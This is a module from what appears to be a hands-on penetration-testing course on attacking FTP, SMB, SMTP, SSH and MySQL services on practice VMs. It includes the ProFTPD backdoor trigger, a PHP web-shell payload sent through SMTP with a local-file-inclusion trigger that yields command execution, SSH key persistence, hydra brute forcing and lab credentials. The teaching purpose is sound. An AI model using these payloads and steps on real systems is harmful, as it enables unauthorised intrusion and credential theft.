# 03 — Service and Network Attacks

Not everything is HTTP. Five machines in this path are entered — or escalated —
through a non-web service, and the habits you build here (enumerate the service's
*own* protocol before reaching for a web tool) are the ones that make you effective
on real networks.

Full treatment: [`docs/CONCEPTS.md` §9](../docs/CONCEPTS.md#9-enumerating-specific-services).

---

## 1. FTP — port 21 (Machines 1, 5)

FTP predates modern authentication: it sends usernames, passwords and file
contents in **cleartext**, and it has a built-in convention for public access — the
account **`anonymous`**, traditionally with an email address or nothing as the
password.

```bash
nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target     # is anonymous on? is it a known-vulnerable version?
ftp target                    # then: anonymous / (blank)
curl -s ftp://anonymous:@target/
wget -r ftp://anonymous:@target/          # mirror the whole tree
```

Inside a session: `ls`, `cd`, `binary`, `get`, `mget`, `put`, `recurse`.

> **`binary` before you download anything non-text.** In the default ASCII mode,
> `get` on a ZIP or an image silently corrupts it. This causes an astonishing
> number of "the archive is broken" dead ends.

**Two questions immediately:**

1. **Is anonymous access enabled?** If yes, list everything and look for
   `backup.zip`, `creds.txt`, `id_rsa`, `notes.txt`, `web.config`, `.sql`,
   `password.txt`. Authors leave the next step in a file named something obvious,
   and real admins do too.
2. **Is it writable?** Does `put shell.php` succeed? A writable FTP root that
   overlaps the web document root is a web-shell upload with no exploitation
   required.

**Version-specific:** `ProFTPD 1.3.3c` ships a **compile-time backdoor** — the
source tarball was replaced by an attacker in 2010, so connecting and sending
`HELP ACIDBITCHEZ` opens a root shell on **port 6200**. Machine 1 is exactly this.
Check the banner version against Exploit-DB *before* assuming you need credentials.

---

## 2. SMB — ports 139 and 445 (Machines 8, 11, 12)

SMB is Windows file and printer sharing, present on most Linux servers via Samba.
It is one of the richest enumeration targets there is: shares, users, groups,
password policy and often files.

```bash
smbclient -L //target/ -N              # list shares with a NULL session (no credentials)
smbclient //target/share -N            # connect; then: ls, cd, get, prompt, recurse
smbmap -H target                       # shares AND your permission on each (R/W!)
enum4linux -a target                   # users, groups, shares, policy — one shot
crackmapexec smb target --shares       # modern, fast, scriptable
rpcclient -U '' -N target              # then: enumdomusers, enumdomgroups, queryuser
nmap --script smb-enum-shares,smb-enum-users,smb-security-mode -p445 target
```

**Always try anonymous/NULL access first** — `-N` means "no password". It is the
most common finding on beginner boxes. `smbmap` shows `READ` or `WRITE` per share;
a **writable** share overlapping the web root is an upload primitive.

### RID cycling: enumerating users without credentials

Windows derives a user's RID (relative identifier) from their account, and the
built-in accounts are predictable: `500` is Administrator, `501` Guest, `1000+` are
normal users. If SMB signing is **not required**, you can query a range of RIDs and
get usernames back:

```bash
crackmapexec smb target --rid-brute 2000
rpcclient -U '' -N target -c 'lookupnames administrator'
```

Machine 8 is built on this: a null session plus RID cycling gives you the user
list, which turns a two-unknown brute force into a one-unknown one.

> **Check `smb-security-mode` output.** "Message signing: **disabled**" or
> "not required" means NTLM relay is possible and RID cycling works. "required"
> means both are blocked — and that single line is the difference between an easy
> machine and a hard one.

### What to hunt for inside shares

`backup.zip`, `web.config`, `*.kdbx`, `id_rsa`, `*.sql`, `site.txt`,
`passwords.xls`, `.bash_history`, and — the one Machine 11 turns on — **actual
correspondence**. A leaked email naming a colleague and a project is often enough
to infer a password without cracking anything.

---

## 3. SMTP — port 25 (Machine 12)

SMTP is mail transport, and two of its commands were designed to *validate*
addresses — which means they disclose whether a user exists:

```bash
nc target 25
VRFY michael        # 250 = exists · 550 = does not
EXPN admin          # expand a mailing list into its members
```

Modern servers usually disable both. If so, the same information leaks from
**login error messages** and from `RCPT TO` during a transaction. Automate with
`smtp-user-enum -M VRFY -U usernames.txt -t target`.

**The far more interesting SMTP attack in this path is log poisoning.** If you can
send mail to a local user and then read the spool — or if the MTA logs your
`MAIL FROM` string into a world-readable file — you can write PHP into a file that
an LFI can include:

```bash
nc target 25
MAIL FROM: <?php system($_GET['c']); ?>
RCPT TO: www-data
DATA
<?php system($_GET['c']); ?>
.
```

Machine 12 combines exactly this with an unprotected **Postfix mailbox** you can
read directly, and an LFI that includes the mail spool. Read
[`docs/CONCEPTS.md` §13.2](../docs/CONCEPTS.md#132-local-file-inclusion-lfi)
alongside it.

Also check the banner version against `searchsploit` — `exim` and `sendmail` have
well-known local root exploits.

---

## 4. SSH — port 22 (nearly every machine)

SSH is usually your *destination*, not your entry point. Three things to know:

**Host key fingerprints (TOFU).** The first time you connect you are asked to
accept a fingerprint. There is no way to verify it out-of-band on a lab box — this
is "trust on first use", and it is a real weakness in the protocol. Just note that
the prompt is a security control, not noise.

**Keys are credentials.** If you find `id_rsa`, `id_ed25519` or `authorized_keys`
anywhere, treat it as seriously as a password:

```bash
ssh -i id_rsa user@target
ssh2john id_rsa > key.hash && john --wordlist=rockyou.txt key.hash   # if passphrase-protected
echo 'my pubkey' >> /home/user/.ssh/authorized_keys                  # persistence, if writable
chmod 600 /home/user/.ssh/authorized_keys                            # sshd IGNORES loose permissions
```

That last `chmod` matters: `sshd` silently refuses an `authorized_keys` with
overly permissive modes, which makes "my key doesn't work" a permissions problem
more often than a key problem.

**Non-standard ports.** Machine 4 and others move SSH off 22. `-p-` finds it;
always connect with `-p <port>`.

**Brute force it last, and gently:**

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target -t 4 -f
```

`-t 4` keeps the rate sane (higher destabilises old VMs and is trivially detected),
`-f` stops at the first success. See [module 04](04-Credentials-and-Cracking.md)
for why the *wordlist* matters far more than the thread count.

---

## 5. Legacy services: the Kioptrix lesson (Machine 5)

Machine 5 is a 2010-era Red Hat box, and it teaches something the modern machines
cannot: **old software is a different discipline.**

You will meet:

| Service | Version | Why it matters |
| --- | --- | --- |
| Apache | 1.3.20 with `mod_ssl` | **OpenFuck / CVE-2002-0082** — a remote root exploit against the SSL module |
| Samba | 2.2.1a | **CVE-2003-0201** — `call_trans2open` remote root |
| `rpc.statd` | old | Historically exploitable via the portmapper |
| SSH | OpenSSH 2.9p2 | Ancient; many known issues |

The skill here is not the exploit — those are public and pre-written. It is:

1. **Getting an exact version** from the banner (`-sV`, or `curl -sI`, or the
   SSL handshake).
2. **Finding the right exploit** for that version *and* the target's architecture
   and distribution. `searchsploit apache 1.3.20`, then read the entry.
3. **Making 20-year-old exploit code compile.** Expect to need `gcc`, specific
   flags, a 32-bit target, patched OpenSSL headers, and occasionally editing the
   source to pick the right offset for the exact distro. This is normal and is the
   actual lesson: real exploitation is often build engineering.
4. **Accepting that it may crash the box.** Snapshot first (see
   [module 00](00-Before-You-Start.md)).

> **Read the exploit before you run it.** Non-negotiable, for three reasons: many
> Exploit-DB entries are *unverified* and some are hostile to whoever runs them;
> you need to know which parameters to change (`RHOST`, target offset, payload);
> and understanding it is the entire point of the exercise.

---

## 6. Databases you will meet directly

| Port | Service | Notes |
| --- | --- | --- |
| 3306 | **MySQL/MariaDB** | Machine 10 exposes it. Try `root:` (empty), `root:root`, and any password you found elsewhere. `mysql -h target -u root -p` |
| 5432 | **PostgreSQL** | Machine 3. Often holds the CMS data |
| 27017 | MongoDB | Not in this path — no auth by default in old versions |
| 6379 | Redis | Not in this path — frequently unauthenticated and writable |

```bash
mysql -h 192.168.56.104 -u root -p'R@v3nSecurity' -e 'show databases;'
mysqldump -h target -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
```

> **`localhost` vs `127.0.0.1` is not cosmetic.** `mysql -u root` with no host
> connects over a **Unix socket** and authenticates by UID; `-h 127.0.0.1` forces
> **TCP** and authenticates by password. A root account that works locally with no
> password can still require one over TCP — and vice versa. Machine 10 turns on
> this distinction.

If you get MySQL access as `root` with `FILE` privileges, you can read and write
files on the server (`LOAD_FILE()`, `INTO DUMPFILE`) and potentially load a **UDF**
(User-Defined Function) to execute system commands. That is a full privilege
escalation path, covered in
[module 05](05-Linux-Privilege-Escalation.md) and Machine 10.

---

## 7. Exercises

1. **Set up an FTP server on Kali** (`sudo apt install vsftpd`), enable anonymous
   read access, then enumerate it from a second terminal with `nmap --script
   ftp-anon` and `curl`. Confirm you can list and download a file you placed there.
2. **Set up Samba** with one share, then run `enum4linux -a`, `smbmap -H`,
   `smbclient -L -N` and `crackmapexec smb --rid-brute` against it. Compare what
   each tool told you. Which found the most?
3. **Read an SMTP banner** and enumerate users with `VRFY` against a local
   Postfix (`sudo apt install postfix`, choose "Local only"). Then disable
   `VRFY` and confirm the enumeration stops.
4. **Connect to SSH with a wrong host key** and read the warning carefully. Write
   down, in your own words, what attack that warning is designed to prevent.
5. **Version-hunt.** Run `sudo nmap -sV -p- -sC` against any VM you have and, for
   every version string, run `searchsploit -t <service> <version>`. Record which
   ones returned entries and read the top result for each. Do not run anything.

---

## 8. Check yourself

1. What are the two credentials you always try on FTP before anything else?
2. Why must you type `binary` in an FTP session before downloading a ZIP?
3. What does `smbclient -L //target -N` test for, and what does success tell you?
4. What is RID cycling, and what SMB setting must be true for it to work?
5. Which two SMTP commands disclose valid usernames, and why are they usually disabled?
6. Why does `mysql -u root` behave differently from `mysql -h 127.0.0.1 -u root`?
7. Name three reasons to read an exploit's source before running it.
8. Why does an old machine like Kioptrix teach you something a modern one cannot?

---

## 9. Annotated command reference — every input, every output

`TARGET` = the victim VM, `ATTACKER` = your Kali on the lab interface.

---

### 9.1 FTP — logging in and moving files

```bash
ftp TARGET
```

```text
Connected to 192.168.56.104.
220 ProFTPD 1.3.3c Server (Debian) [::ffff:192.168.56.104]
Name (192.168.56.104:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access allowed, restricted to /var/ftp
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45123|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 0        0            4096 Dec 07  2017 pub
226 Transfer complete
ftp> cd pub
250 CWD command successful
ftp> binary
200 Type set to I
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||51884|)
150 Opening BINARY mode data connection for backup.zip (41234 bytes)
100% |*************************************| 41234       12.4 MiB/s    00:00 ETA
226 Transfer complete
41234 bytes received in 00:00 (11.8 MiB/s)
ftp> quit
221 Goodbye.
```

**The input**

| Token | Meaning |
| --- | --- |
| `ftp TARGET` | connect to port **21** by default. `ftp TARGET 2121` for another port |
| `anonymous` | the conventional public account. Some servers also accept `ftp` |
| *(password)* | traditionally an email address; most servers accept anything, including blank |
| `ls` | list the current remote directory |
| `cd pub` | change remote directory |
| `binary` | switch the transfer mode to **image/binary** |
| `get FILE` | download one file. `mget *` downloads many (it prompts per file unless you type `prompt` first to disable prompting) |
| `put FILE` | upload — **fails unless the server allows writes**, which is itself a major finding |
| `quit` | log out cleanly |

**Reading the output — FTP reply codes are the story**

FTP is a text protocol; every line the server sends starts with a **three-digit code**.
Learn these and you can read any FTP session:

| Code | Meaning | Why you care |
| --- | --- | --- |
| `220` | service ready — the **banner** | `ProFTPD 1.3.3c Server (Debian)` → exact software and version, before you authenticate |
| `331` | username OK, **need password** | `Anonymous login ok` confirms anonymous access is enabled |
| `230` | **login successful** | `Anonymous access allowed, restricted to /var/ftp` also reveals the chroot path |
| `530` | login incorrect | credentials refused |
| `150` / `125` | opening the **data connection** | FTP uses two channels: control (21) and a separate data port |
| `226` | transfer complete | success |
| `229` | entering **extended passive mode** | the server tells you which port to fetch the data from |
| `200` | command OK | e.g. `Type set to I` after `binary` (`I` = image = binary) |
| `250` | requested file action OK | e.g. `CWD command successful` |
| `550` | file unavailable / permission denied | the file is not there, or you may not touch it |

**`binary` is not optional.** The default mode is **ASCII**, which translates line
endings during transfer. On a ZIP, an image or a compiled binary that silently corrupts
the file — and you get "unzip: cannot find zipfile directory" and blame the box instead
of yourself. `200 Type set to I` is your confirmation it took effect.

**The two questions to ask on every FTP banner:** is `anonymous` accepted (→ read
everything), and is the root **writable** (→ `put shell.php` and you have a web shell
with no exploitation at all)?

```bash
curl -s ftp://anonymous:@TARGET/            # list without an interactive session
curl -s ftp://anonymous:@TARGET/pub/backup.zip -o backup.zip
wget -r -q ftp://anonymous:@TARGET/         # mirror the whole tree
nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 TARGET
```

The last one is how Machine 1 announces itself:

```text
21/tcp open  ftp     ProFTPD 1.3.3c
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 0        0          2264 Dec 07  2017 deets.txt
|_drwxr-xr-x   2 0        0          4096 Dec 07  2017 pub
| ftp-vuln-cve2010-4221:
|   VULNERABLE:
|   ProFTPD-1.3.3c -- Backdoor Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2010-4221  OSVDB:69563
|     Description:
|       ProFTPD 1.3.3c backdoor, this was reported to be distributed with the
|       original source archive, the backdoor was removed from the archive after a few hours.
|     References:
|       https://www.exploit-db.com/exploits/13574
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221
```

Read that as three separate facts: **(1)** anonymous login works, **(2)** the listing
shows a readable `deets.txt` (owner UID/GID `0 0` = root), and **(3)** the version is
*confirmed vulnerable and exploitable* to a backdoor command execution, with the CVE and
the Exploit-DB reference. That is a complete root path from one nmap run — which is why
`-sC` and targeted `--script` arguments are worth the extra seconds.

---

### 9.2 SMB — listing, connecting, and pulling files

```bash
smbclient -L //TARGET/ -N
```

```text
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        helios          Disk      Helios personal share
        IPC$            IPC       IPC Service (symfonos.localdomain server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server                Comment
        ---------             -------
        SYMFONOS

        Workgroup             Master
        ---------             -------
        WORKGROUP             SYMFONOS
```

| Token | Meaning |
| --- | --- |
| `-L //TARGET/` | **L**ist the shares offered by that host, then exit |
| `-N` | **no password** — attempt an anonymous/NULL session |
| `-U 'helios%qwerty'` | authenticate as user `helios` with password `qwerty` |
| `--option='client min protocol=NT1'` | force the legacy SMBv1 protocol when a 2010-era server refuses modern negotiation |

**Reading it**

1. **`Anonymous login successful`** — the most important line on the screen. No
   credentials were needed to reach the share list. That is a finding by itself.
2. The table is `Sharename | Type | Comment`:
   - **`Disk`** = a file share you can browse.
   - **`IPC$`** with type `IPC` = the inter-process channel, not a file share. It is
     how enumeration RPCs (including `enum4linux`) talk to the server.
   - `print$` = printer driver share, almost always access-denied. Ignore it.
   - The **`Comment`** column is free text set by the administrator — and administrators
     write useful things in it. `Helios personal share` names a person.
3. `Reconnecting with SMB1 for workgroup listing` — smbclient fell back to the legacy
   protocol to enumerate the **workgroup** and the **master browser** (`SYMFONOS`). If
   this line is followed by `protocol negotiation failed: NT_STATUS_INVALID_PARAMETER`,
   the server has SMBv1 disabled and you simply skip the workgroup listing — the share
   list above is what mattered.
4. Share *names* tell you nothing about permissions. `-L` shows what exists; `smbmap`
   shows what you may **do**.

```bash
smbmap -H TARGET
```

```text
    ________  ___  ___  _______   ___  ___
   |\   ____\|\  \|\  \|\  ___ \ |\  \|\  \
   \ \  \___|\ \  \\\  \ \   __/|\ \  \\\  \
    \ \_____  \ \  \\\  \ \  \_|/_\ \  \\\  \
     \|____|\  \ \  \\\  \ \  \_|\ \ \  \\\  \
       ____\_\  \ \_______\ \_______\ \_______\
      |\_________\|_______|\|_______|\|_______|
      \|_________|

[+] IP: 192.168.56.104:445        Name: 192.168.56.104
        Disk                    Permissions     Comment
        ----                    -----------     -------
        print$                  NO ACCESS       Printer Drivers
        sambashare              READ ONLY       Samba on Ubuntu
        helios                  NO ACCESS       Helios personal share
        IPC$                    NO ACCESS       IPC Service
```

**`Permissions` is the column that decides your next move.** `READ ONLY` = you can list
and download (enough for Machine 11's entire foothold). `READ, WRITE` = you can upload —
and if that share maps into the web document root, you have a web shell with no
exploitation. `NO ACCESS` = you need credentials. Note that `-L` happily listed `helios`
while `smbmap` correctly reports you cannot enter it: **visibility is not access.**

```bash
smbclient //TARGET/sambashare -N
```

```text
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 21 03:29:40 2020
  ..                                  D        0  Tue Jul 21 03:20:11 2020
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020

                24292244 blocks of size 1024. 12736104 blocks available
smb: \> get mailsent.txt
getting file \mailsent.txt (as mailsent.txt) (246.3 KiloBytes/sec) (average 246.3 KiloBytes/sec)
smb: \> prompt
smb: \> recurse
smb: \> mget *
smb: \> exit
```

The `ls` columns mirror a Unix listing: **name, type flag, size, timestamp**. The type
flag is `D` = directory, `N` = normal file, `A` = archived, `H` = hidden, `r` =
read-only. **Look for `H`** — hidden files on shares are frequently the interesting ones
(`.old_pass.bak`, `.bash_history`, `.htpasswd`). The footer
(`24292244 blocks of size 1024`) is free disk space, occasionally interesting when you
need to know whether a large upload will fit.

`prompt` disables the per-file confirmation, and `recurse` makes `mget` descend into
subdirectories — together, `mget *` then mirrors the share without asking 400 questions.
**`get` transfers in the current mode; use `prompt off` + `recurse on` before `mget`** or
you will spend five minutes pressing Enter.

---

### 9.3 `enum4linux` — users, groups and policy in one shot

```bash
enum4linux -a TARGET
```

```text
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )
Target Information:
    Target ......................................... 192.168.56.104
    RID Range ...................................... 500-550,1000-1050
    Username ....................................... ''
    Password ....................................... ''

 ======================================================
|    Enumerating Workgroup/Domain on 192.168.56.104  |
 ======================================================
[+] Got domain/workgroup name: WORKGROUP

 ======================================================
|    Nbtstat Information for 192.168.56.104          |
 ======================================================
Looking up status of 192.168.56.104
        SYMFONOS        <00>  -         B <ACTIVE>  Workstation Service
        SYMFONOS        <03>  -         B <ACTIVE>  Messenger Service
        SYMFONOS        <20>  -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01>  - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00>  - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e>  - <GROUP> B <ACTIVE>  Browser Service Elections

 ==============================================
|    Users on 192.168.56.104                 |
 ==============================================
index: 0x1 RID: 0x3e8 User: helios    User Name: helios   Description:
index: 0x2 RID: 0x3e9 User: zeus      User Name: zeus     Description:

[+] Enumerating users using SID S-1-5-21-2046125541-1885132331-1319258395 and logon username '', password ''
S-1-5-21-…-1000 SYMFONOS\helios (Local User)
S-1-5-21-…-1001 SYMFONOS\zeus (Local User)
S-1-22-1-1000 Unix User\helios (Local User Name)

 ======================================================
|    Share Enumeration on 192.168.56.104           |
 ======================================================
        Sharename       Type      Comment
        ---------       ----      -------
        anonymous       Disk
        helios          Disk
```

| Token | Meaning |
| --- | --- |
| `-a` | **all** simple enumeration: workgroup, nbtstat, users, groups, shares, password policy. The flag you almost always want |
| `-U` | users only · `-S` shares only · `-G` groups only · `-P` password policy · `-o` OS info |
| `-u USER -p PASS` | authenticate first; authenticated enumeration returns far more than anonymous |
| `-r` | enumerate users by **RID cycling** |
| `-R RANGE` | the RID range to cycle (default `500-550,1000-1050`) |

**Reading it**

1. **`RID Range: 500-550,1000-1050`** — this is the RID-cycling window. Windows (and
   Samba) assign each account a **RID**; `500` is the built-in Administrator, `501`
   Guest, and ordinary local users start at `1000`. enum4linux asks "does RID 1000
   exist? 1001? …" and reads back the names.
2. **`Got domain/workgroup name: WORKGROUP`** — the NetBIOS workgroup.
3. The **NetBIOS name table** is a fingerprint of what services the host advertises:
   `<00>` workstation, `<03>` messenger, **`<20>` file server**, `<1d>`/`<1e>` browser
   election, `..__MSBROWSE__.` master browser. `<GROUP>` means the name belongs to the
   workgroup rather than the host. **`<20>` present = a file/print server is running**,
   which is your confirmation that SMB is genuinely in use and not just listening.
4. `index: 0x1 RID: 0x3e8 User: helios` — `0x3e8` is hexadecimal for **1000**, the
   first ordinary user. Two rows → two local accounts: `helios` and `zeus`.
5. **`S-1-5-21-…-1000 SYMFONOS\helios (Local User)`** — the full **SID**. The
   `S-1-5-21-…` prefix is unique to this machine, so knowing it lets you predict every
   other account's SID by changing only the last number. `(Local User)` distinguishes a
   real account from a built-in group.
6. `S-1-22-1-1000 Unix User\helios` — Samba's Unix-side mapping. It confirms `helios`
   is a genuine **system** account (so it probably has a home directory and can log in
   over SSH), not just an SMB-only identity.

**Why this matters operationally:** you have turned an unknown into a *two-username,
three-password* problem. Combined with `attention.txt`'s banned-password list on
Machine 12, that is six attempts — and `smbclient -U 'helios%qwerty'` works on the
first.

```bash
crackmapexec smb TARGET --rid-brute 2000
crackmapexec smb TARGET --shares
crackmapexec smb TARGET -u '' -p '' --pass-pol
```

```text
SMB  192.168.56.104  445  SYMFONOS  [*] Windows 6.1 Build 0 (name:SYMFONOS) (domain:symfonos.localdomain) (signing:False) (SMBv1:True)
SMB  192.168.56.104  445  SYMFONOS  445  SYMFONOS [+] symfonos.localdomain\  RID 1000  helios
SMB  192.168.56.104  445  SYMFONOS  445  SYMFONOS [+] symfonos.localdomain\  RID 1001  zeus
```

That first line is dense with information and worth reading carefully:
**`(signing:False)`** means SMB signing is not required — NTLM relay attacks are possible
and RID cycling will work. **`(SMBv1:True)`** means the legacy protocol is enabled,
which is how EternalBlue-class exploits reach the host. Both are findings independent of
anything else you do.

```bash
rpcclient -U '' -N TARGET
rpcclient$> enumdomusers
user:[helios] rid:[0x3e8]
user:[zeus] rid:[0x3e9]
rpcclient$> queryuser 0x3e8
        User Name   :   helios
        Full Name   :   helios
        Comment     :
        Acb Info    :   0x00000010 (0x10)
        Primary GID :   0x0000001f
rpcclient$> lookupnames administrator
administrator S-1-5-21-2046125541-1885132331-1319258395-500 (User: 1)
rpcclient$> exit
```

`rpcclient` gives you the raw MS-RPC interface — the same one Windows uses. `enumdomusers`
lists accounts, `queryuser <RID>` dumps one account's attributes, `lookupnames`
resolves a name to a SID (here confirming the built-in Administrator is RID **500**),
and `enumdomgroups` lists groups. `Acb Info` is a bitmask of account flags;
`0x10` = `ACB_NORMAL` (a normal enabled account), while `0x04` would mean disabled.

---

### 9.4 SMTP — enumerating users and poisoning a mailbox

```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t TARGET
```

```text
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/.../xato-net-10-million-usernames.txt
Target count ............. 1
Username count ........... 10000
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Sat May 11 12:40:11 2024 #########
192.168.56.104: helios exists
192.168.56.104: root exists
192.168.56.104: postmaster exists
######## Scan completed at Sat May 11 12:41:02 2024 #########
3 results.

51 queries in 51 seconds (1.0 queries / sec)
```

| Token | Meaning |
| --- | --- |
| `-M VRFY` | the **m**ethod: `VRFY`, `EXPN` (expand a mailing list) or `RCPT` (pretend to send mail). Try `VRFY` first; if the server rejects it, `RCPT` often still leaks the same information from its error text |
| `-U file` | a **U**sername list. `-u name` for a single name |
| `-t TARGET` | the **t**arget host. `-T file` for many hosts |
| `-p 25` | port, if non-standard |
| `-D domain` | append `@domain` to each name — needed when the server only accepts fully-qualified addresses |

**Reading it.** `helios exists` means the server answered `250` to `VRFY helios`. The
scan is only *possible* because the server advertises `250-VRFY` in its `EHLO` response
— a modern hardened MTA answers `502 5.5.1 VRFY command is disabled` for everyone and
this tool returns zero results. **Three valid usernames from 10,000 guesses in 51
seconds** is why disabling `VRFY` is a standard hardening step, and why
`1.0 queries / sec` (deliberately throttled) is still fast enough to matter.

**Poisoning the mailbox** (Machine 12's entire foothold):

```bash
nc TARGET 25
```
```text
220 symfonos.localdomain ESMTP Postfix (Ubuntu)
EHLO attacker
250-symfonos.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
MAIL FROM: attacker@kali
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: test
<?php system($_GET['c']); ?>
.
250 2.0.0 Ok: queued as 8F1C240A3B
QUIT
221 2.0.0 Bye
```

Line by line: `MAIL FROM:` sets the envelope sender → `250 2.1.0 Ok`. `RCPT TO:` sets the
recipient → `250 2.1.5 Ok` (**this also confirms the user exists**, even when `VRFY` is
disabled — which is why `-M RCPT` works as a fallback method). `DATA` → **`354`** means
"start typing the message; end it with a line containing only a dot". Your PHP goes into
the body. The lone `.` on its own line terminates it → `250 2.0.0 Ok: queued as
8F1C240A3B` (a queue ID you can cite in a report).

**Then trigger it:**

```bash
curl "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Three weaknesses combined into RCE, and it is worth being precise about all three:
**(1)** Postfix accepted mail from an unauthenticated stranger for a local user;
**(2)** the message was written to `/var/mail/helios`, a file the web server process
could read; **(3)** a plugin passed a user-controlled path to `include()`. Remove any one
and the chain dies. That is the report you write.

Note that the whole *body* of the mail — including the SMTP headers Postfix adds
(`Received:`, `Return-Path:`) — lands in that file. Your `MAIL FROM:` string is also
written there, which is why some log-poisoning variants put the PHP in the sender
address instead of the body.

---

### 9.5 SSH — keys, ports and what the warnings mean

```bash
ssh -i id_rsa -p 7744 tom@TARGET
```

```text
The authenticity of host '[192.168.56.104]:7744 ([192.168.56.104]:7744)' can't be established.
ED25519 key fingerprint is SHA256:Xk3jH9vB2mQpLr7Yt5NwZc8Fd1Gh6Js0Al4Ke9Rm2Tn.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.104]:7744' (ED25519) to the list of known hosts.
Linux dc-2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Last login: Sat May 11 09:12:44 2024 from 192.168.56.10
tom@dc-2:~$
```

| Token | Meaning |
| --- | --- |
| `-i id_rsa` | use this **private key** file instead of a password |
| `-p 7744` | non-standard port. **Omitting this on Machine 4 means "connection refused"** |
| `user@host` | who to log in as and where |
| `-o StrictHostKeyChecking=no` | skip the fingerprint prompt. Convenient, and exactly the behaviour an attacker wants — so it is also what a defender should never enable |
| `-o UserKnownHostsFile=/dev/null` | do not record the key. Useful when re-imaging the same IP repeatedly in a lab |
| `-L 8080:localhost:80` | **local port forward**: your `localhost:8080` becomes the target's `localhost:80`. This is how you reach an app bound only to the target's loopback |
| `-R 4444:localhost:4444` | **remote** forward: the target's port 4444 reaches back to yours |
| `-D 1080` | a SOCKS proxy through the tunnel |
| `-N` | do not execute a remote command (tunnelling only) · `-f` go to background · `-v`/`-vvv` debug |
| `-t 'command'` | force a TTY and run a command — `ssh user@host -t 'bash --noprofile'` is a restricted-shell escape |

**Reading the output**

1. **The host-key prompt is a security control, not noise.** SSH is *trust on first use*:
   it cannot verify whose key this is, so it shows you the fingerprint and asks. It then
   writes the key to `~/.ssh/known_hosts`. If you ever see
   `REMOTE HOST IDENTIFICATION HAS CHANGED!` for an IP that should be stable, that is
   either a rebuilt VM (harmless, in a lab) or a **man-in-the-middle** (catastrophic, in
   production). Fix a lab one with
   `ssh-keygen -R '[192.168.56.104]:7744'` — note the **brackets and port**, which is the
   exact form `known_hosts` uses for non-standard ports.
2. `ED25519 key fingerprint is SHA256:…` — the key type. Ed25519 is modern and good. A
   **1024-bit DSA** key here is a finding (Machine 2 has one), and a 1024-bit RSA key is
   weak.
3. The **MOTD** leaks `Linux dc-2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2` — the
   hostname, the exact kernel version and build date. That is a free `uname -a` before
   you have typed anything, and it is why hardened servers disable MOTD.
4. `Last login: Sat May 11 09:12:44 2024 from 192.168.56.10` — the previous session's
   time and source. If it is not *your* previous session, someone else is on this box.
5. `tom@dc-2:~$` — the prompt. Read it as `user@host:cwd$`, where **`$` means
   unprivileged and `#` means root**. That single character is the fastest possible
   orientation check.

**Key permissions are enforced, silently:**

```bash
chmod 700 ~/.ssh && chmod 600 ~/.ssh/id_rsa && chmod 600 ~/.ssh/authorized_keys
```

`ssh` **refuses to use a key that other users can read**, with
`Permissions 0644 for 'id_rsa' are too open.` — and `sshd` likewise **ignores an
`authorized_keys` that is group- or world-writable**, without any error in your session.
"When my key does not work" is a permissions problem more often than a key problem.

```bash
hydra -l tom -P cewl-list.txt ssh://TARGET -s 7744 -t 4 -f
```

`-s 7744` sets the port for hydra (it does *not* read your ssh config). `-t 4` keeps the
rate low enough that the old VM does not start dropping connections, and `-f` stops at
the first success. Higher thread counts against SSH do not just risk detection — they
cause `MaxStartups` throttling on the server, which produces false negatives and makes
you conclude a valid password is invalid.

---

### 9.6 Databases you reach directly

```bash
mysql -h TARGET -u root -p'H4u%QJ_H99' -D Users -e 'SELECT * FROM users;'
```

```text
+------+----------+------------------------------------------+
| User | Password | Perms                                    |
+------+----------+------------------------------------------+
| kent | Sld6WHVCSkpOeQ== | 1                                        |
| mike | U0lmZHNURW42SQ== | 1                                        |
| kane | aVN2NVltMkdSbw== | 0                                        |
+------+----------+------------------------------------------+
```

| Token | Meaning |
| --- | --- |
| `-h TARGET` | connect over **TCP**. Omitting `-h` connects over a **Unix socket** to the local server |
| `-u root` | the database user |
| `-p'PASS'` | the password, **no space after `-p`**, and **single-quoted** so `$`, `%` and `!` are not mangled by the shell. Omit the value entirely to be prompted securely |
